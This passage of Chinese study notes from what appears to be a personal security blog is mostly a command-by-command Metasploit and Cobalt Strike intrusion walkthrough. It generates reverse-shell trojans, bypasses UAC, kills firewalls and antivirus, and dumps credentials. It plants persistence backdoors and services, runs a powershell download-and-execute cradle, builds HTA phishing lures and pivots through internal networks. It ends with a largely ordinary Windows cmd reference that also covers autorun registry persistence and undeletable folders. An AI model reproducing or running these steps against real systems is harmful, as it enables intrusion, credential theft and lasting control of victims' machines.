payload.ps1</p><p><strong>生成linux的：</strong></p><p>msfvenom -a x86 –platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=自己ip LPORT=4444 -f elf -o payload.elf</p><p>生成python木马（攻击载荷这里都是开源的，linux自带python，可以对开源的载荷进行修改）：</p><p>msfvenom -p python/meterpreter/reverse_tcp LHOST=自己ip LPORT=4444 -f raw -o payload.py</p><p>冰山一角</p><hr><p>sessions -i 1  进入之前的木马</p><p>介绍meterpreter操作</p><p>除了之前的shell，screenshot之外</p><h3 id="meterpreter基本操作"><a href="#meterpreter基本操作" class="headerlink" title="meterpreter基本操作"></a>meterpreter基本操作</h3><p>getuid   查看木马当前权限</p><p>getsystem 直接提权（有风险，有可能会报错，被发现，也有可能因为权限不够提权，导致function不被support，即被发现）</p><p><strong>UAC提权：</strong>（用户账户控制，这个权限越高，越会通知东西）</p><p>利用一个针对UAC的漏洞进行提权</p><p>考虑使用ask模块提权</p><p> background  木马进入后台 用sessions命令查看</p><p>use exploit/windows/local/ask  加载ask模块</p><p>info 查看漏洞信息</p><p>show options</p><p>set SESSION 2  使用进程2的木马（就是之前的木马）</p><p>set FILENAME qq.exe 伪装成qq</p><p>set LHOST 自己ip</p><p>exploit  运行，会在用户桌面上弹出一个允许qq启动，用户选择yes，成功（演示从a普通用户提权到管理员权限）</p><p>此时getuid发现不是system，再用getsystem提高到最高</p><hr><p><strong>uac绕过提权</strong>（成功率不高）</p><p>use exploit/windows/local/bypassuac (多用来攻击32位系统)</p><p>show options</p><p>set SESSION 1</p><p>exploit 开始攻击</p><p>如果攻击成功会给你一个新的session号</p><p>（在win7版本中需要目标用户有一个administrator的身份才可以，而且UAC不能一直是最高，这是截至目前发现的）</p><p>进入新的session号</p><p>getuid</p><p>getsystem</p><p>一般msf这个放在公网上可以打掉一大部分电脑，SESSION部分没有图像化界面，操作不过来，所以更多用来做定向攻击</p><hr><h3 id="msf攻击流程"><a href="#msf攻击流程" class="headerlink" title="msf攻击流程"></a>msf攻击流程</h3><h4 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a>生成木马</h4><pre><code>kali-1    生成简单的木马    msfvenom -a x86 -platform windows -p windows/meterpreter/reverse_tcp LHOST=[自己ip] LPORT=[自己端口] -b &quot;\x00&quot; -e x86/shikata_ga_nai -f exe &gt; msf.exekali-2    msfconsole    use exploit/multi/handler    set payload windows/meterpreter/reverse_tcp    set lhost [自己ip]    set lport [自己端口]    exploit 开始监听background 退到后台sessions 查看被控端sessions -i [id] 控制哪一台jobs 查看当前后台任务back 后退一格-------------------</code></pre><h4 id="提高程序运行级别"><a href="#提高程序运行级别" class="headerlink" title="提高程序运行级别"></a>提高程序运行级别</h4><pre><code>    getuid 查看当前用户名    getsystem 直接提权backgrounduse exploit/windows/local/ask 加载ask模块info 查看用途set session [id]set filename [qq.exe]exploit 执行-----------------UAC绕过（不一定有效）    use exploit/windows/local/bypassuac    set sesssion [id]    exploit    getuid    getsystem-----------------</code></pre><h4 id="查看本地提权漏洞"><a href="#查看本地提权漏洞" class="headerlink" title="查看本地提权漏洞"></a>查看本地提权漏洞</h4><pre><code>    use post/multi/recon/local_exploit.....    使用漏洞建议模块    set session [id]    run---------------</code></pre><h4 id="目标信息搜集"><a href="#目标信息搜集" class="headerlink" title="目标信息搜集"></a>目标信息搜集</h4><pre><code>    sessions -i [id]    run post/windows/gather/.....    run scraper 导出所有信息    ~/.msf4/logs/scripts/scraper/[目标ip]    run winenum 搜集系统信息（环境变量）--------------</code></pre><h4 id="信息嗅探"><a href="#信息嗅探" class="headerlink" title="信息嗅探"></a>信息嗅探</h4><pre><code>    load sniffer 加载嗅探模块    sniffer_interfaces 枚举所有网卡信息    sniffer_start 2 开始监听2号网卡    sniffer_dump 2 2.cap 数据包捕获到/root/2.cap    background    use auxiliary/sniffer/psnuffls    show options    set pcapfile /root/2.cap    exploirt 对数据包进行解包-------------</code></pre><h4 id="关闭防火墙开启3389"><a href="#关闭防火墙开启3389" class="headerlink" title="关闭防火墙开启3389"></a>关闭防火墙开启3389</h4><pre><code>netsh advfirewall set allprofiles state offnet stop windefend关闭depbcdeit.exe /set &#123;current&#125; nx AlwaysOffkalirun killavrun post/windows/manage/killav开启远程桌面run post/windows/manage/enable_rdprun getgui -e 开启远程桌面并且创建一个新用户run getgui -u username -p password开启远程桌面并且绑定8888端口run getgui -e -f 8888kali远程连接桌面rdesktop -u 用户名 -p 密码 [目标ip]-------------------------</code></pre><h4 id="植入永久后门"><a href="#植入永久后门" class="headerlink" title="植入永久后门"></a>植入永久后门</h4><pre><code>通过服务启动run metsvc -Abackground---jobs可以看到一个监听use exploit/multi/handlerset payload windows/metsvc_bind_tcpset RHOST [目标ip]set LPORT 31337exploit启动型后门run persistence -A -S -U -i 60 -p 4321 -r [黑客ip]或run persistence -X -i 60 -p 4321 -r [黑客ip]</code></pre><hr><h3 id="github上msf附加的东西"><a href="#github上msf附加的东西" class="headerlink" title="github上msf附加的东西"></a>github上msf附加的东西</h3><p>做关于免杀的东西</p><p>比如，the fat rat胖老鼠，标星4.9k的那个，本质上是一个后门生成器</p><h4 id="the-fat-rat"><a href="#the-fat-rat" class="headerlink" title="the fat rat"></a>the fat rat</h4><p>根据文档安装</p><p>直接在kali上git clone……</p><p>https:// github.com/Screetsec/TheFatRat 实战要把源码进行改造，否则分钟被抓到</p><p>youtube.com/watch?v=lg10XojT84M</p><p>如果对安卓感兴趣可以参考下面大佬</p><p><a href="https://github.com/M4sc3r4n0/Evil-Droid">https://github.com/M4sc3r4n0/Evil-Droid</a></p><p><a href="http://github.com/jbreed/apkin">http://github.com/jbreed/apkin</a></p><hr><h2 id="CS"><a href="#CS" class="headerlink" title="CS"></a>CS</h2><h3 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h3><pre><code>java开发  多人协作--------------------流程    攻击机上：./teamserver 攻击机ip  攻击机密码    本机：./cobaltstrike   使用该启动器启动   exe后缀是win平台使用    连接teamserver ，写入密码    新建listener ，add ,payload(使用哪种方法监听器上线，beacon http)    host rotation strategy(默认round-robin)    http host 是攻击机ip    右下代理，增加被溯源难度    attacks——web drive-by——script web deliver    powershell use x64    生成攻击载荷    在目标机器cmd中运行 powershell.exe -nop -w hidden -c &quot;IEX ((new-object web.client).downloadstring(&#39;http://listener的ip:80/a&#39;))&quot;    目标上线    sleep，心跳    右键 interact     shell ipconfig    help查看可执行命令------------------</code></pre><h3 id="cs模块介绍"><a href="#cs模块介绍" class="headerlink" title="cs模块介绍"></a>cs模块介绍</h3><pre><code> attacks-packages-payload generator生成木马源码，自己做免杀，自己写个shellcode luncher-----------------beacon功能（右键）    elevate svc-exe 提权        hashdump         shell net user        run ipconfig  run与shell功能一样        powershell mkdir 123        powerpick mkdir 123 不通过powershell执行命令，效果一样        powershell-import ./xxx.ps1 把某个ps脚本加载内存中，再使用powershell运行        execute notepad在后台执行记事本    access-runMimikatz     logonpasswords  因系统而言    access-makeToken  password这里不用管，hash也行 伪装某个用户执行命令，如果该用户是域控，可以模拟生成令牌        explore-net view 可以看到目标所在内网的其他主机，发现共享域，可直接在beacon中 net localgroup,net computers,net domain_trusts, net logons,查看登录，net share查看共享    explore-process list 查看目标主机的进程，可以找个系统进程注入payload进去，和msf开局类似，内存运行时删不了文件，,inject ,log keystrokes,view中打开键盘记录视图查看，对全局有效，，    explore-browser pivot 劫持目标ie浏览器，在目标主机上开启一个代理，通过本地浏览器劫持目标的cookie实现免登陆效果    explore-desktop vnc 打开远程窗口图形化界面操作，传输比较慢不推荐使用    explore-port scan         pivoting-socks server 以肉鸡的某个端口 的进程 做pivoting代理，入侵该内网的其他主机    pivoting-listener 联机控制 在肉鸡上设置第二个listener，作为跳板攻击内网其他机器        spawn 模块派发shell    用spawn这个模块发指定权限的一个shell给别的兄弟，通过rundll32.exe实现-------------------常用命令    getprivs获取当前肉鸡beacon的所有权限，和shell whoami /priv-------------------------</code></pre><h3 id="aggresor脚本"><a href="#aggresor脚本" class="headerlink" title="aggresor脚本"></a>aggresor脚本</h3><pre><code>sleep语言，对cs的二次开发 .cna文件命令    help    e定义 e $a=&quot;haha&quot;    x 输出x $a    load 加载    tron 开启函数跟踪，执行到什么位置    ls 查看已加载  如果修改完，直接reload 列表ls中的相同名称的文件语法    % 字典    @数组    foreach $var (@arr1)&#123;        println($var);    &#125;    ------------------------        @arr1 = @(&#39;a1&#39;,&#39;a2&#39;,887);        println(@arr1[1]);    保存为t1.cna  缩进    在script console(利用java解释器)中load /root/t1.cna 实现交互    java -jar sleep.jar(没在腾讯课堂中给)    -----------------------        $x = 2;        %dic[&quot;key1&quot;] = &quot;value1&quot;;        %dic[&quot;key2&quot;] = &quot;value2&quot;;        %dic[$x] = &quot;value3&quot;;        println(&quot;%dic is&quot;.%dic[&quot;key2&quot;]);    -----------------------     交互命令创建        sub fun1&#123;            println(&quot;run fun1!!!!now $1&quot;);        &#125;        command mingling &#123;            fun1($1);        &#125;    reload t1.cna    在script console中输入 mingling diaoyongfun1    此时mingling这个命令直接注册到ls列表中，在console使用help可查看 ------------------------ c2客户端    设置快捷键    bind Ctrl+O &#123;      show_message(&quot;this is a alert, bind to ctrl+o with bind&quot;);      elog(&quot;i am log,print log to the event log window&quot;);    &#125;    添加菜单    popup caidan&#123;        item(&quot;&amp;item1&quot;,&#123;url_open(&quot;http://www.baidu.com&quot;)&#125;);        separator();        item(&quot;&amp;item2&quot;,&#123;url_open(&quot;http://www.cctv.com&quot;)&#125;);        separator();        item(&quot;&amp;item3&quot;,&#123;show_message(&quot;please pay for it~&quot;)&#125;)    &#125;    menubar(&quot;my caidanname&quot;,&quot;caidan1&quot;);  绑定到上面的popup函数    添加到右键目标菜单    popup beacon_bottom&#123;        menu &quot;attack&quot;&#123;            item(&quot;&amp;item1&quot;,&#123;url_open(&quot;http://www.baidu.com&quot;)&#125;);            item(&quot;&amp;item2&quot;,&#123;show_message(&quot;how are you&quot;)&#125;)        &#125;    &#125;    github搜cna脚本，拓展cs功能    ------------------------------------------------------    cs中的数据模型(数据接口)        targets      存储的目标信息    显示上线过的主机信息        archives     显示最近的信息    显示最近的输出信息，慎用很卡        beacons      显示所有的受感染的主机信息   显示在线和上线过的主机        credentials  显示凭据信息      我们抓取过的密码信息和制作的票据信息        downloads    显示下载信息      显示我们在受控端下载的信息        keystrokes   记录键盘输入      当我们选择进程记录键盘的时候，会将得到的键盘信息记录下来        screenshots  屏幕截屏显示      显示我们截图的二进制信息流        sites        托管的资产        看起来是我们创建的监听的端口stager回连的端口     -----------------    x  targets()  显示目标信息    x  targets()[0]  数组结构    x  targets()[0][&#39;name&#39;] 字典类型    x  beacons()    cna中    command showme&#123;        println(&quot;ip address is:&quot;.targets()[$1][&quot;address&quot;].&quot;\n os is&quot;.targets()[$1][&quot;os&quot;]);    &#125;    reload name.cna    showme    =====================</code></pre><h3 id="clonesite-钓鱼"><a href="#clonesite-钓鱼" class="headerlink" title="clonesite 钓鱼"></a>clonesite 钓鱼</h3><pre><code>    attacks-packages-html application    exe,powershell都可 ，生成hta文件，    attacks-web driveby hostfile  选择hta文件，local url名字也改为hta，获得下载地址    后面只需要让目标访问即可，    目标使用ie浏览器，打开，弹窗可以隐藏，肉鸡即可上线    web driveby  clonesite    这种方法还挺多的    clone url http://www.baidu.com https不行    如果是内网可以配合arp欺骗    attack选择hta的那个============================</code></pre><h3 id="服务权限维持"><a href="#服务权限维持" class="headerlink" title="服务权限维持"></a>服务权限维持</h3><pre><code>    beacon在内存中容易被发现    伪装    win：注册表，启动项，计划任务，服务，shift，放大镜，其他安装的软件    肉鸡上线后，    attack-packages-windows executable(s)   生成第二个木马exe，作为我们二段跳，    upload /root/b.exe，(之后可以设置b.exe运行后自动删除)可把该exe程序放到c:\windows\temp\     将其写到服务中    shell sc creat &quot;thisserver&quot; binpath=&quot;c:\windows\temp\b.exe&quot; 创建服务并关联    shell sc description &quot;thisserver&quot; &quot;weizhuangfuwumingcheng&quot;    shell sc config &quot;thisserver&quot; start=auto 开机自启    shell net start &quot;thisserver&quot; 启动服务    木马上线    服务器重启之后，之前肉鸡木马失效，但写入自启服务的会上线</code></pre><p>​<br>    深入内网之后<br>    hack(192.168.1.186)———(192.168.1.231)server(172.16.214.140)———-(172.16.214.141)server2<br>    ———————</p><h3 id="多层连接"><a href="#多层连接" class="headerlink" title="多层连接"></a>多层连接</h3><p>多层类似第一层</p><h4 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h4><pre><code>    server1已上线，    生成一个listeners， payload使用beacon tcp    4444端口即可    attacks-packages-windows executable(s)  (s)这里可以使用tcp，  生成后直接放到server2上    但在server1的beacon的interact中没发现上线    connect 172.16.214.141   之后上线</code></pre><h4 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h4><pre><code>多层反向连接（多用）    反向更好规避防火墙查杀，溯源难度大点    server1 中招    beacon 右键 pivoting listener   此时中间人的4444端口充当hack转发器    选用中间人listener    attacks-packages-windows executable(s)  选择server1的listener，生成beacon，想办法在目标机器上运行    运行后直接上线</code></pre>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MSF </tag>
            
            <tag> CS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>win系统常用命令</title>
      <link href="2023/03/30/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/win%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>2023/03/30/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/win%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>win10<strong>企业版</strong>，<strong>专业工作站版本不错</strong>，其他版本不能很好地支持一些命令</p><p>cmd可视为powershell的子集</p><h3 id="文件-夹-的增删改查"><a href="#文件-夹-的增删改查" class="headerlink" title="文件(夹)的增删改查"></a>文件(夹)的增删改查</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> 显示当前目录</span><br><span class="line"><span class="built_in">cd</span> .. 进入上级目录</span><br><span class="line"><span class="built_in">cd</span> . 还在当前目录</span><br><span class="line"><span class="built_in">cd</span> [文件夹名字] 进入文件夹</span><br><span class="line"><span class="built_in">dir</span> 显示当前目录</span><br><span class="line"><span class="built_in">dir</span> /b 只显示文件名</span><br><span class="line"><span class="built_in">dir</span> /S 递归显示所有内容</span><br><span class="line"><span class="built_in">dir</span> /X 现实别名，可以用来删除畸形文件与文件夹</span><br><span class="line"><span class="built_in">dir</span> <span class="built_in">ni</span>* 显示所有开头为<span class="built_in">ni</span>的文件</span><br><span class="line">tree [文件夹] 以树状图显示文件</span><br><span class="line"><span class="built_in">ren</span> [目标] [新名字]重命名 这里目标可以是绝对路径，（自己不在该目录下）</span><br><span class="line"></span><br><span class="line">rename 学习资料 <span class="string">&quot;学习资料../&quot;</span>  将文件夹重命名带有点结尾的，win不允许，所以删不掉打不开除非格式化</span><br><span class="line"><span class="built_in">dir</span> /x 查看文件短名字，复制用rename重命名为合法名字，即可打开</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mkdir [文件夹名] 创建文件夹</span><br><span class="line"><span class="built_in">rmdir</span> [文件夹名] 删除文件夹</span><br><span class="line"><span class="built_in">cd</span> <span class="string">&quot;matlab 2016a&quot;</span> 当文件名有空格时使用双引号包裹</span><br><span class="line"><span class="built_in">md</span> c:\test\<span class="number">123</span> 递归创建文件夹（只能创建文件夹）</span><br><span class="line"><span class="built_in">rd</span> /s /q c:\test 静默删除test文件夹下的所有东西</span><br><span class="line"><span class="built_in">copy</span> go.txt c:\haha 复制go.txt到haha文件夹下</span><br><span class="line"><span class="built_in">copy</span> go.txt c:\haha\gogogo.txt 复制的同时还改名</span><br><span class="line"><span class="built_in">copy</span> /Y go1.txt+go2.txt go3.txt 合并文件夹（涉及隐写术）不换行</span><br><span class="line"><span class="built_in">copy</span> /b <span class="number">123</span>.jpg + 学习资料.zip new.jpg 将图片与压缩包合并，通过修改后缀名可打开查看</span><br><span class="line"><span class="built_in">move</span> 移动/剪切</span><br><span class="line"><span class="built_in">move</span> go1.txt c:\haha 剪切当前目录下的go1.txt到c盘的haha目录下，可直接改名</span><br><span class="line"><span class="built_in">del</span> go2.txt 删除某个文件</span><br><span class="line"><span class="built_in">del</span> [文件夹] 删除文件夹中的所有内容</span><br><span class="line"><span class="built_in">del</span> /f [文件夹] 强制删除</span><br><span class="line"><span class="built_in">del</span> /f /s /q [文件夹] 静默强制删除（不会询问是否确认删除）</span><br><span class="line">replace a.txt c:\new 把当前目录下的a.txt替换成c:\new目录下的a.txt</span><br><span class="line"><span class="built_in">type</span> a.txt 查看a.txt中的内容</span><br><span class="line"><span class="built_in">type</span> a.txt | more 慢慢看，按空格再显示</span><br></pre></td></tr></table></figure><h3 id="注册表文件"><a href="#注册表文件" class="headerlink" title="注册表文件"></a>注册表文件</h3><p>注册表对于win系统来说相当于神经系统</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">运行输入regedit，召唤注册表</span><br><span class="line"></span><br><span class="line">reg add <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;</span> /v haha /t REG_SZ /d <span class="string">&quot;c:\a.txt&quot;</span> /f  强制在开机启动项注册表目录中添加一条叫haha的，/t类型为REG_SZ的项，运行文件为c:\a.txt 强制运行  开机启动项重启生效</span><br><span class="line"></span><br><span class="line">reg delete <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;</span> /v haha /f 强制删除这个叫haha的开机启动项</span><br><span class="line"></span><br><span class="line">reg export <span class="string">&quot;hkcu\software\Microsoft\Unified Store&quot;</span> c:\abc.reg 将该项注册表导出到c:命名为abc.reg 用于备份，双击该reg文件即可恢复注册表文件，与导入命令等效</span><br><span class="line"></span><br><span class="line">reg import c:\abc.txt 导入注册表文件</span><br><span class="line"></span><br><span class="line">reg query <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\IEXPLORE.EXE&quot;</span> /s 查看指定注册项</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="命令执行顺序"><a href="#命令执行顺序" class="headerlink" title="命令执行顺序"></a>命令执行顺序</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&amp; 按顺序执行多条命令，不管是否出错</span><br><span class="line">ipconfig &amp; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line">&amp;&amp; 按顺序，出错则停止执行</span><br><span class="line">ipconfig &amp;&amp; <span class="built_in">dir</span></span><br><span class="line">find <span class="string">&quot;x&quot;</span> c:\a.txt &amp;&amp; <span class="built_in">echo</span> <span class="string">&#x27;success&#x27;</span> 在a.txt中，如果发现x字符，就输出success</span><br><span class="line"></span><br><span class="line">|| 按顺序执行多条命令，当碰到正确的，就不继续执行</span><br><span class="line">find <span class="string">&quot;x&quot;</span> c:\a.txt || <span class="built_in">echo</span> <span class="string">&#x27;success&#x27;</span></span><br><span class="line"></span><br><span class="line">| 管道命令</span><br><span class="line"><span class="built_in">dir</span> *.* /s /a <span class="number">2</span>&gt;&amp;<span class="number">1</span> | find /c <span class="string">&quot;.exe&quot;</span></span><br><span class="line">输出当前目录下所有文件夹包括子文件夹中的exe文件个数</span><br><span class="line"></span><br><span class="line">&gt; 把当前命令输出的内容进行覆盖（重定向）</span><br><span class="line">tasklist &gt; <span class="number">1</span>.txt 把当前任务列表（同任务管理器）中的内容输出到<span class="number">1</span>.txt文件中，<span class="built_in">cd</span> . &gt; <span class="number">2</span>.txt 就相当于创建一个txt</span><br><span class="line"></span><br><span class="line">&gt;&gt; 追加型重定向，不会覆盖</span><br><span class="line"><span class="built_in">echo</span> aaaaa &gt;&gt; <span class="number">1</span>.txt</span><br><span class="line"></span><br><span class="line">&lt; 从文件中获取信息</span><br><span class="line">date &lt; <span class="number">1</span>.txt  获取<span class="number">1</span>.txt的信息作为date的输入内容</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">@</span> 命令修饰符</span><br><span class="line">@<span class="built_in">cd</span> /d c:\new 执行命令的时候不打印内容（只能对输入正确命令生效）</span><br><span class="line"></span><br><span class="line">，逗号代替空格</span><br><span class="line"><span class="built_in">cd</span>,.. = <span class="built_in">cd</span> .. （很多防火墙不给输入空格）</span><br><span class="line"></span><br><span class="line">; 执行命令相同时，分离目标</span><br><span class="line"><span class="built_in">dir</span> c:\haha;c:\new</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="常用实用命令"><a href="#常用实用命令" class="headerlink" title="常用实用命令"></a>常用实用命令</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cls</span> 清屏</span><br><span class="line">ver 查看系统版本号</span><br><span class="line">winver 查看window版本号</span><br><span class="line">whoami 我是谁</span><br><span class="line">query user查询用户登录状态</span><br><span class="line">hostname 查看主机名</span><br><span class="line">vol 查看当前卷的序列号</span><br><span class="line">label 显示当前分区的卷标（有些企业会用到）</span><br><span class="line">label c:system 给c盘命名</span><br><span class="line">date /t 显示当前日期</span><br><span class="line">time /t 显示当前时间</span><br><span class="line"><span class="built_in">start</span> /max notepad.exe 最大化打开记事本文件，运行中也可以直接调出notepad.exe</span><br><span class="line">calc 弹出计算器</span><br><span class="line"><span class="keyword">exit</span> <span class="number">0</span> 退出cmd</span><br><span class="line">systeminfo 查看系统详细信息，包括补丁</span><br><span class="line">wmic 查看硬件信息</span><br><span class="line">wmic logicaldisk 查看逻辑磁盘信息</span><br><span class="line">logoff 注销用户</span><br><span class="line"></span><br><span class="line">shutdown /s 关闭计算机</span><br><span class="line">shutdown /s /t <span class="number">3600</span> 一小时后关机</span><br><span class="line">shutdown /a 终止系统关闭</span><br><span class="line"></span><br><span class="line">shutdown /<span class="built_in">r</span> 重启</span><br><span class="line"></span><br><span class="line">format d:/FS:ntfs /Q 快速格式化d盘，文件系统为ntfs系统</span><br><span class="line">chkdsk /f d:修复d盘的错误</span><br><span class="line"></span><br><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off/on 关闭开启防火墙，allprofiles可以替换为currentprofiles，domainprofiles，接触域环境之后了解</span><br><span class="line"></span><br><span class="line">schtasks /creat /<span class="built_in">sc</span> minute /mo <span class="number">20</span> /tn <span class="string">&quot;haha&quot;</span> /tr c:\cmd.bat</span><br><span class="line">创建一个名为haha的计划任务，任务每<span class="number">20</span>分钟执行一次cmd.bat</span><br><span class="line"></span><br><span class="line">schtasks /delete /tn <span class="string">&quot;haha&quot;</span> /f 删除名为haha的计划任务</span><br><span class="line"></span><br><span class="line">schtasks /run /tn <span class="string">&quot;haha&quot;</span> 现在运行计划任务</span><br><span class="line">schtasks /<span class="keyword">end</span> /tn <span class="string">&quot;haha&quot;</span> 停止运行计划任务</span><br></pre></td></tr></table></figure><h3 id="文本处理命令"><a href="#文本处理命令" class="headerlink" title="文本处理命令"></a>文本处理命令</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">find /N /I <span class="string">&quot;haha&quot;</span> a.txt 在a.txt中带着行号显示查找带有haha字符串的，忽略大小写的结果</span><br><span class="line">find /C <span class="string">&quot;haha&quot;</span> a.txt 在a.txt中，haha出现了几次</span><br><span class="line">findstr <span class="string">&quot;lai le&quot;</span> a.txt 在a.txt中发现lai le这个字符串，显示这行</span><br><span class="line">findstr /C:<span class="string">&quot;ai&quot;</span> a.txt 在a.txt中搜索关键词ai</span><br><span class="line">findstr /S /I <span class="string">&quot;ai&quot;</span> *.* 忽略大小写情况下，在当前所有目录和子目录所有文件中搜索关键词ai</span><br><span class="line">findstr <span class="string">&quot;^wo&quot;</span> a.txt 在a.txt中搜索以wo字符为开头的（这里^wo用到正则表达式）</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="自补充其他命令"><a href="#自补充其他命令" class="headerlink" title="自补充其他命令"></a>自补充其他命令</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">time 显示当前时间</span><br><span class="line">[命令] /? 获取帮助</span><br><span class="line">ctrl+z  ctrl+c  中断执行</span><br><span class="line">A: 从c盘进入到A盘</span><br><span class="line">chcp 查看cmd默认字符编码，默认<span class="number">936</span>是GBK (汉字内码扩展规范)</span><br><span class="line">chcp <span class="number">65501</span> <span class="number">65501</span>代表utf<span class="literal">-8</span> （使用nc传输中文乱码问题待解决）</span><br><span class="line"></span><br><span class="line">arp /a 查看arp表</span><br><span class="line">netsh i i show <span class="keyword">in</span> 查看本地连接的网卡id</span><br><span class="line">netsh <span class="literal">-c</span> <span class="string">&quot;i i&quot;</span> add neighbors <span class="number">11</span> <span class="string">&quot;192.168.1.1&quot;</span> <span class="string">&quot;aa-bb-cc-00-10-10&quot;</span> 将自己id强行绑定到路由器mac地址上</span><br><span class="line">此时已突破arp欺骗</span><br><span class="line"></span><br><span class="line">explorer.exe 启动文件资源管理器</span><br><span class="line"></span><br><span class="line">查看MD5值  MD5重合的概率是<span class="number">2</span>e<span class="literal">-128</span></span><br><span class="line">certutil <span class="literal">-hashfile</span> 文件名 MD5</span><br><span class="line">查看 SHA1</span><br><span class="line">certutil <span class="literal">-hashfile</span> 文件名 SHA1</span><br><span class="line">查看SHA256</span><br><span class="line">certutil <span class="literal">-hashfile</span> 文件名 SHA256</span><br><span class="line"></span><br><span class="line">win平台安装<span class="built_in">wget</span>之后</span><br><span class="line"><span class="built_in">wget</span> <span class="literal">-c</span>[断点续传]<span class="literal">-t</span> <span class="number">0</span>[重试次数] [<span class="type">url</span>] </span><br></pre></td></tr></table></figure><h3 id="畸形文件夹"><a href="#畸形文件夹" class="headerlink" title="畸形文件夹"></a>畸形文件夹</h3><p>由Windows系统漏洞造成的无法删除情况。一些恶意软件往往利用系统漏洞建立一些畸形的非法文件，最常见的就是后边带…的文件夹。五种方法建立一个非法文件，列举如下（cmd中运行）</p><p>1、md c:\…\  这种方法建立的文件夹是隐藏的、不可打开、无法删除的，当然隐藏不是指普通的隐藏，这种隐藏在Windows自带的资源管理器中无论如何也看不到。</p><p>2、md “c:\test / “ 